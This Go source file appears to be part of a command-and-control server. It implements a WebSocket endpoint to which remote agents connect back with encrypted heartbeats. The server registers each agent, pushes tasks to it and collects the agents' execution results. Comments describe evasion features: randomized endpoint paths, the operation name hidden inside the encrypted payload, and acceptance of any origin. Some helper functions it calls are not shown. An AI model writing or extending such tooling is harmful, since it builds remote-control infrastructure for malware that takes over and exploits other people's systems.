package main

import (
	"io"
	"log"
	"net/http"
	"strings"

	"github.com/gorilla/websocket"
)

// ============ WebSocket Agent 回连端点 ============
// 与 HTTP Agent 共用 agentMux（端口 8443），传输层改为 WebSocket
// 消息内容: 纯 base64(IV+密文) 文本帧，与 HTTP body 格式一致
// 通信流程: 客户端连接后发 heartbeat（含 client_id）→ 服务端注册到连接池
//          → 服务端可主动推送任务 → 客户端执行后回传 result
// _op 字段隐入加密 payload 内部，服务端解密后分发到对应 handler

// agentUpgrader Agent WebSocket 升级器（CheckOrigin 允许所有来源）
var agentUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

// handleAgentWebSocket WebSocket Agent 升级处理器
// 注册在 agentMux 的 /ws/agent/ 路径（通配符，路径随机化 /ws/agent/<16位hex>）
func handleAgentWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := agentUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[WS Agent] Upgrade failed: %v", err)
		return
	}
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	log.Printf("[WS Agent] Connection from %s", remoteAddr)

	var registeredClientID string
	var agentConn *AgentConn

	defer func() {
		// 连接断开时注销
		if registeredClientID != "" {
			unregisterAgentConn(registeredClientID)
			log.Printf("[WS Agent] Unregistered %s (client_id=%s)", remoteAddr, registeredClientID)
		}
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[WS Agent] ReadMessage failed from %s: %v", remoteAddr, err)
			break
		}
		log.Printf("[WS Agent] Received %d bytes from %s", len(msg), remoteAddr)

		// 构造假 Request 调用现有解密逻辑（Body 用 io.NopCloser 包裹 strings.Reader）
		fakeReq := &http.Request{
			Method:     http.MethodPost,
			RemoteAddr: remoteAddr,
			Header:     http.Header{},
			Body:       io.NopCloser(strings.NewReader(string(msg))),
		}
		data, err := decryptRequestData(fakeReq)
		if err != nil {
			log.Printf("[WS Agent] Decrypt failed from %s: %v (server algo=%s, msg_len=%d, first16=%x)",
				remoteAddr, err, getGlobalAlgo(), len(msg), []byte(string(msg))[:min(16, len(msg))])
			conn.WriteMessage(websocket.TextMessage, []byte(""))
			continue
		}
		op, _ := data["_op"].(string)
		delete(data, "_op")
		log.Printf("[WS Agent] op=%s from %s", op, remoteAddr)

		// heartbeat 时提取 client_id 并注册连接（用于服务端主动推送）
		if op == "heartbeat" {
			clientID := getString(data, "client_id", "")
			if clientID != "" {
				detectedAlgo := getDetectedAlgo(fakeReq)
				agentConn = registerAgentConn(clientID, "websocket", detectedAlgo, getEncPassword(), conn, nil)
				registeredClientID = clientID
				log.Printf("[WS Agent] Registered client_id=%s (algo=%s)", clientID, detectedAlgo)
			}
		}

		// 用 responseRecorder 捕获加密响应，写回 WebSocket
		rec := &responseRecorder{}
		switch op {
		case "heartbeat":
			handleAgentHeartbeatDecrypted(rec, fakeReq, data)
		case "pull":
			handleAgentPullDecrypted(rec, fakeReq, data)
		case "result":
			handleAgentResultDecrypted(rec, fakeReq, data)
		default:
			writeEncryptedError(rec, fakeReq, 404)
		}
		log.Printf("[WS Agent] op=%s done, response %d bytes to %s", op, len(rec.body), remoteAddr)

		// 写回时需要加锁，避免与 pushTaskToAgent 的推送交叉
		if agentConn != nil {
			agentConn.WriteMu.Lock()
			conn.WriteMessage(websocket.TextMessage, rec.body)
			agentConn.WriteMu.Unlock()
		} else {
			conn.WriteMessage(websocket.TextMessage, rec.body)
		}
	}
}

// responseRecorder 捕获 writeEncryptedResponse 的输出（WS/TCP 共用）
// 实现 http.ResponseWriter 接口，将写入的字节缓存到 body
type responseRecorder struct {
	body       []byte
	statusCode int
	header     http.Header
}

func (r *responseRecorder) Header() http.Header {
	if r.header == nil {
		r.header = http.Header{}
	}
	return r.header
}

func (r *responseRecorder) Write(b []byte) (int, error) {
	r.body = append(r.body, b...)
	return len(b), nil
}

func (r *responseRecorder) WriteHeader(code int) {
	r.statusCode = code
}
